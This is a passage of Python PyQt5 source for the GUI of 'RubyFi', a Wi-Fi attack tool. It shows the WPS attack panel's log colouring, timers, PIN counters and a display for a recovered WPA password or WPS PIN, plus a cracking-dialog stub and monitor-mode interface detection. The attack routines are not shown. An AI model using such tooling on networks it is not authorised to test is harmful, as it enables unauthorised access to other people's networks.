        self.wps_log.setMaximumHeight(110)
        self.wps_log.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 4px;
                color: #c9d1d9;
                padding: 5px;
                font-family: monospace;
                font-size: 11px;
            }
        """)
        layout.addWidget(self.wps_log)

        return panel

    # ═══════════════════════════════════════════════════════════════
    #  SIGNAL SLOTS
    # ═══════════════════════════════════════════════════════════════

    def _wps_on_status(self, message):
        self.log(message)
        if not hasattr(self, "wps_log"):
            return

        import time as _t
        ts    = _t.strftime("%H:%M:%S")
        lower = message.lower()

        if "found" in lower or "psk" in lower or "✅" in message or "🔓" in message or "🔑" in message:
            colour = "#00ff88"
        elif "!" in message or "error" in lower or "fail" in lower or "not enabled" in lower:
            colour = "#ff006e"
        elif "pixie" in lower or "brute" in lower or "⚡" in message or "🔢" in message:
            colour = "#00b4d8"
        elif "trying" in lower or "pin" in lower:
            colour = "#ffbe0b"
        elif "locked" in lower or "rate" in lower or "⚠" in message:
            colour = "#ff9900"
        else:
            colour = "#c9d1d9"

        self.wps_log.append(
            f"<span style='color:{colour};'>[{ts}] {message}</span>"
        )

    def _wps_on_phase(self, text, colour):
        if not hasattr(self, "wps_phase_label"):
            return
        self.wps_phase_label.setText(text)
        self.wps_phase_label.setStyleSheet(
            f"color:{colour}; font-size:22px; font-weight:bold;"
            f"background:#0d1117; border-radius:6px; padding:10px;"
            f"margin:4px 0; border:1px solid {colour};"
        )
        # update panel border colour to match phase
        if hasattr(self, "wps_panel"):
            self.wps_panel.setStyleSheet(f"""
                QWidget {{
                    background: #161b22;
                    border: 2px solid {colour};
                    border-radius: 8px;
                    padding: 10px;
                }}
            """)

    def _wps_on_stats(self, elapsed, progress, pins_tried):
        if hasattr(self, "wps_time_lbl"):
            mins = elapsed // 60
            secs = elapsed % 60
            self.wps_time_lbl.setText(
                f"{mins}m {secs:02d}s" if mins > 0 else f"{elapsed}s"
            )
        if hasattr(self, "wps_progress_lbl") and progress != "—":
            self.wps_progress_lbl.setText(progress)
        if hasattr(self, "wps_pins_lbl") and pins_tried != "—":
            self.wps_pins_lbl.setText(pins_tried)
            # flash red → normal
            self.wps_pins_lbl.setStyleSheet(
                "color:#ff4444; font-size:26px; font-weight:bold; border:none;"
            )
            QTimer.singleShot(
                300,
                lambda: hasattr(self, "wps_pins_lbl") and
                self.wps_pins_lbl.setStyleSheet(
                    "color:#ff006e; font-size:26px; font-weight:bold; border:none;"
                ),
            )

    def _wps_tick_timer(self):
        """Update elapsed time display every second from the QTimer."""
        if not hasattr(self, "_wps_start_time"):
            return
        elapsed = int(time.time() - self._wps_start_time)
        if hasattr(self, "wps_time_lbl"):
            mins = elapsed // 60
            secs = elapsed % 60
            self.wps_time_lbl.setText(
                f"{mins}m {secs:02d}s" if mins > 0 else f"{elapsed}s"
            )

    def _wps_on_result(self, result_type, value):
        """Credential found — show it in the credential box with flash."""
        if not hasattr(self, "wps_cred_box"):
            return

        if result_type == "psk":
            label = f"🔓  WPA PSK (Password){value}"
        else:
            label = f"🔑  WPS PIN{value}"

        self.wps_cred_box.setText(label)
        self.wps_cred_box.setVisible(True)

        # flash animation: yellow → green
        self.wps_cred_box.setStyleSheet("""
            QLabel {
                color: #ffbe0b;
                font-size: 16px; font-weight: bold; font-family: monospace;
                background: #0d1117; border: 2px solid #ffbe0b;
                border-radius: 6px; padding: 12px; margin: 4px 0;
            }
        """)
        QTimer.singleShot(600, lambda: hasattr(self, "wps_cred_box") and
            self.wps_cred_box.setStyleSheet("""
                QLabel {
                    color: #00ff88;
                    font-size: 16px; font-weight: bold; font-family: monospace;
                    background: #0d1117; border: 2px solid #00ff88;
                    border-radius: 6px; padding: 12px; margin: 4px 0;
                }
            """)
        )

        self.log(f"🔑 WPS {result_type.upper()} FOUND: {value}")

        # notification sound
        try:
            import subprocess as _sp
            _sp.Popen(
                ["paplay", "/usr/share/sounds/freedesktop/stereo/complete.oga"],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
            )
        except Exception:
            pass

    def _wps_on_complete(self, success, message):
        """Final signal from the thread."""
        if hasattr(self, "wps_timer"):
            self.wps_timer.stop()

        if success:
            # freeze spinner → solid green
            if hasattr(self, "wps_spinner"):
                self.wps_spinner.setRange(0, 100)
                self.wps_spinner.setValue(100)
                self.wps_spinner.setStyleSheet("""
                    QProgressBar {
                        border: 1px solid #00ff88;
                        border-radius: 4px; background: #0d1117; height: 6px;
                    }
                    QProgressBar::chunk { background: #00ff88; border-radius: 4px; }
                """)
            self.log(f"✅ WPS Attack SUCCESS: {message}")
            QMessageBox.information(
                self, "✅  WPS Attack Successful!",
                f"Credential recovered:{message}",
            )
        else:
            self.log(f"WPS Attack ended: {message}")
            if hasattr(self, "wps_phase_label"):
                self.wps_phase_label.setText("❌  NO RESULT")
                self.wps_phase_label.setStyleSheet(
                    "color:#8b949e; font-size:20px; font-weight:bold;"
                    "background:#0d1117; border-radius:6px; padding:10px;"
                    "margin:4px 0; border:1px solid #8b949e;"
                )
            if hasattr(self, "wps_spinner"):
                self.wps_spinner.setRange(0, 100)
                self.wps_spinner.setValue(0)

        self._wps_cleanup_ui()

    # ── crack password stub ──────────────────────────────────────
    def crack_password(self):
        from PyQt5.QtWidgets import QDialog
        from gui.cracking_tab import CrackingTab
        dialog = QDialog(self)
        dialog.setWindowTitle("🔓 RubyFi — Password Cracking")
        dialog.resize(1100, 700)
        dialog.setStyleSheet("background: #0d1117;")
        lay = QVBoxLayout(dialog)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.addWidget(CrackingTab(dialog))
        dialog.exec()

    
    def _apply_interface(self, interface: str, mode: str):
        """Central updater for all interface-related UI."""
        self.current_interface = interface
        self.current_mode      = mode
        icon = "✅" if mode == "Monitor" else "🔵"
        self.iface_label.setText(f"🔌 Interface: {interface} ({mode}) {icon}")
        self.update_status()

    def _auto_detect_monitor_interface(self):
        """Read iw dev and auto-populate interface/mode if monitor is already active."""
        try:
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            iface = None
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    iface = line.split()[-1]
                elif "type monitor" in line and iface:
                    self._apply_interface(iface, "Monitor")
                    self.log(f"🔍 Auto-detected monitor interface: {iface}")
                    return True
        except Exception:
            pass

        # Fallback: look for *mon named interfaces via ip link
        try:
            result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.splitlines():
                if ": " in line:
                    candidate = line.split(":")[1].strip().split("@")[0]
                    if "mon" in candidate.lower():
                        self._apply_interface(candidate, "Monitor")
                        self.log(f"🔍 Auto-detected monitor interface: {candidate}")
                        return True
        except Exception:
            pass
        return False

       

    # ═══════════════════════════════════════════════════════════════
    #  STOP / CLEANUP
    # ═══════════════════════════════════════════════════════════════

    def stop_wps(self):
        if hasattr(self, "wps_timer"):
            self.wps_timer.stop()
        if hasattr(self, "wps_thread") and self.wps_thread.isRunning():
            self.log("Stopping WPS attack ...")
            self.wps_thread.stop()
            self.wps_thread.wait()
            self.log("WPS attack stopped.")
        self._wps_cleanup_ui()

    def _wps_cleanup_ui(self):
        for attr in ("wps_panel", "wps_stop_btn"):
            if hasattr(self, attr):
                getattr(self, attr).deleteLater()
                delattr(self, attr)
        for attr in (
            "wps_phase_label", "wps_cred_box",
            "wps_time_lbl", "wps_progress_lbl", "wps_pins_lbl",
            "wps_spinner", "wps_log",
            "wps_timer", "_wps_start_time",
        ):
            if hasattr(self, attr):
                delattr(self, attr)




def run_gui():
    """Entry point"""
    app = QApplication(sys.argv)
    font = QFont("Ubuntu", 10)
    app.setFont(font)
    
    window = RubyFiWindow()
    window.show()
    
    sys.exit(app.exec())


if __name__ == "__main__":
    run_gui()

